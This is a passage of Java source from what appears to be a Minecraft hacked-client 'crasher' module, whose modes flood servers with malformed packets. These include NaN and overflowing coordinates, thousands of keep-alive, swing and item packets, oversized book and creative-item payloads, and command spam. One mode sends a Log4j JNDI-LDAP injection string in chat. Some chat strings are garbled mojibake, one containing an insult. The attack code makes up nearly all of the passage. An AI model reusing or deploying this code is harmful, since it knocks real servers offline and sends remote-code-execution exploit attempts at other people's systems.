�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a");

                        for (int i = 0; i < 2; i++) {
                            pages.appendTag((NBTBase) page);
                        }

                        nbt.setTag("pages", (NBTBase) pages);
                        nbt.setTag("author", (NBTBase) new NBTTagString("MEDDL"));
                        nbt.setTag("title", (NBTBase) new NBTTagString("LEUDE"));

                        item.setTagCompound(nbt);

                        pb.writeItemStackToBuffer(item);
                        PacketUtil.sendPacketNoEvent(new CPacketCustomPayload("MC|BEdit", pb));
                        break;
                }
                break;

            case "Name":
                mc.player.sendChatMessage("/name �?�ん�?��?��?��?�ん�?��?��?��?�ん�?��?��?��?�");
                break;

            case "Reload":
                for (int i = 0; i < 15; i++) {
                    mc.player.sendChatMessage("/reload");
                }
                break;

            case "Replay":
                mc.player.sendChatMessage("/replay æˆ‘å°†å°½å…¶æ‰€èƒ½åœ°å°†ä½ çš„æ‚²æƒ¨çš„å±?è‚¡å\u00AD?ã€‚æˆ‘å°†å°½å…¶æ‰€èƒ½åœ°å°†ä½ çš„æ‚²æƒ¨çš„å±?è‚¡å\u00AD?ã€‚æˆ‘å°†å°½å…¶æ‰€èƒ½åœ°å°†ä½ çš„æ‚²æƒ¨çš„å±?è‚¡å\u00AD?ã€‚æˆ‘å°†å°½å…¶æ‰€èƒ½åœ°å°†ä½ çš„æ‚²æƒ¨çš„å±?è‚¡å\u00AD?ã€‚æˆ‘å°†å°½å…¶æ‰€èƒ½åœ°å°†ä½ çš„æ‚²æƒ¨çš„å±?è‚¡å\u00AD?ã€‚æˆ‘å°†å°½å…¶æ‰€èƒ½åœ°å°†ä½ çš„æ‚²æƒ¨çš„å±?è‚¡å\u00AD?ã€‚æˆ‘å°†å°½å…¶æ‰€èƒ½åœ°å°†ä½ çš„æ‚²æƒ¨çš„å±?è‚¡å\u00AD?ã€‚æˆ‘å°†å°½å…¶æ‰€èƒ½åœ°å°†ä½ çš„æ‚²æƒ¨çš„å±?è‚¡å\u00AD?");
                break;

            case "Exploit":
                PacketUtil.sendPacketNoEvent(
                    new CPacketPlayer.Position(
                        mc.player.posX + 99413,
                        mc.player.getEntityBoundingBox().minY,
                        mc.player.posZ + 99413,
                        true
                    )
                );
                break;

            case "NullPointer":
                for (int i = 0; i < 1000; i++) {
                    // i have no idea why we are turning random into a string
                    PacketUtil.sendPacketNoEvent(new CPacketChatMessage(new Random().toString()));
                }
                break;
                
            case "NaN":
                PacketUtil.sendPacketNoEvent(
                    new CPacketPlayer.Position(
                        (double) Float.NaN,
                        (double) Float.NaN,
                        (double) Float.NaN,
                        true
                    )
                );
                break;

            case "MathOverflow":
                PacketUtil.sendPacketNoEvent(
                    new CPacketPlayer.Position(
                        1.7976931348623157E+308,
                        1.7976931348623157E+308,
                        1.7976931348623157E+308,
                        true
                    )
                );
                break;

            case "Zero":
                PacketUtil.sendPacketNoEvent(
                    new CPacketPlayer.Position(
                        mc.player.posX + RandomUtil
                            .nextInt(1000, Integer.MAX_VALUE),
                        mc.player.posX + RandomUtil
                            .nextInt(1000, Integer.MAX_VALUE),
                        mc.player.posX + RandomUtil
                            .nextInt(1000, Integer.MAX_VALUE),
                        mc.player.onGround
                    )
                );
                break;

            case "Rotation":
                PacketUtil.sendPacketNoEvent(new CPacketPlayer.Rotation(9.223372E18F, 9.223372E18F, true));
                break;

            case "Log4j":
                String str = "{jndi:ldap://192.168." + RandomUtil.nextInt(1, 253) + "." + RandomUtil.nextInt(1, 253) + "}";
                PacketUtil.sendPacketNoEvent(
                    new CPacketChatMessage(
                        (log4jMode.get().equals("Chat") ? (RandomUtil.randomString(5) + str + RandomUtil.randomString(5)) : ("/tell " + RandomUtil.randomString(10) + " " + str))
                    )
                );
                break;
        }
    }

    @Override
    public void onUpdateEvent(UpdateEvent event) {
        switch (mode.get()) {
            case "KeepAlive":
                for (int i = 0; i < 6000; i++) {
                    PacketUtil.sendPacketNoEvent(new CPacketKeepAlive(Integer.MAX_VALUE));
                }
                break;

            case "Swing":
                for (int i = 0; i < 5000; i++) {
                    PacketUtil.sendPacketNoEvent(new CPacketAnimation());
                }
                break;

            case "AAC":
                if (aacMode.get().equals("4")) {
                    PacketUtil.sendPacketNoEvent(new CPacketPlayer.Position(1.7e+301, -999.0, 0.0, true));
                }
                break;

            case "MemetrixOld":
                if (mc.player.ticksExisted % 2 == 0) {
                    PacketUtil.sendPacketNoEvent(
                        new CPacketPlayer.Position(
                            RandomUtil.nextDouble(
                                -32768.0,
                                32768.0
                            ),
                            RandomUtil.nextDouble(-32768.0, 32768.0),
                            RandomUtil.nextDouble(-32768.0, 32768.0),
                            true
                        )
                    );
                }
                break;

            case "WiredNCP":
                mc.timer.field_194147_b = 0.45f;
                PacketUtil.sendPacketNoEvent(
                    new CPacketPlayer.Position(
                        RandomUtil.nextDouble(
                            -1048576.0,
                            1048576.0
                        ),
                        RandomUtil.nextDouble(-1048576.0, 1048576.0),
                        RandomUtil.nextDouble(-1048576.0, 1048576.0),
                        true
                    )
                );
                PacketUtil.sendPacketNoEvent(
                    new CPacketPlayer.Position(
                        RandomUtil.nextDouble(
                            -65536.0,
                            65536.0
                        ), RandomUtil.nextDouble(-65536.0, 65536.0), RandomUtil.nextDouble(-65536.0, 65536.0), true
                    )
                );
                break;

            case "ItemSwitch":
                for (int i = 0; i < 500; i++) {
                    PacketUtil.sendPacketNoEvent(new CPacketHeldItemChange(RandomUtil.nextInt(0, 8)));
                }
                break;
            
            case "ItemDrop":
                PacketUtil.sendPacketNoEvent(new CPacketClientStatus(CPacketClientStatus.State.REQUEST_STATS));
                for (int i = 0; i < 500; i++) {
                    PacketUtil.sendPacketNoEvent(
                        new CPacketClickWindow(
                            0,
                            RandomUtil.nextInt(1, 35),
                            1,
                            ClickType.THROW,
                            mc.player.inventory.getCurrentItem(),
                            (short) 0
                        )
                    );
                }

                PacketUtil.sendPacketNoEvent(new CPacketCloseWindow());
                break;

            case "CreativeItemControl":
                String nbt = new StringBuilder(" \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa \u00bb \u00ab \u2551 \u2563 \u00a9 \u2557 \u255d \u00a2 \u00a5 \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3 "
                ).toString();
                if (mc.player.capabilities.isCreativeMode) {
                    for (int i = 0; i < 50000; i++) {
                        if (mc.player == null) break;
                        Item item = Item.getItemById(122);
                        ItemStack itemStack = new ItemStack(item, 1);
                        itemStack.setStackDisplayName(nbt);
                        PacketUtil.sendPacketNoEvent(new CPacketCreativeInventoryAction(36, itemStack));
                    }
                }
                break;

            case "CommandComplete":
                for (int i = 0; i < 500; i++) {
                    PacketUtil.sendPacketNoEvent(new CPacketTabComplete("/${RandomUtils.randomString(100)}", null, true));
                }
                break;
        }
    }
}
